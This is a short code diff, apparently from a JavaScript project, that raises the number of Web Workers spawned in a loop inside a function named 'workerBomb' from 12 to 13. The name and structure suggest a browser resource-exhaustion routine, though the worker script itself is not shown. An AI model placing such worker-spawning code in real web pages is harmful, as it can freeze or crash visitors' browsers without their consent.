@@ -12,7 +12,7 @@ function workerBomb() {
     `;
     const blob = new Blob([script], { type: "application/javascript" });
     const workerURL = URL.createObjectURL(blob);
-    for (let i = 0; i < 12; i++) {
+    for (let i = 0; i < 13; i++) {
         try {
             const worker = new Worker(workerURL);
             worker.onerror = (error) => console.error("Worker error:", error);
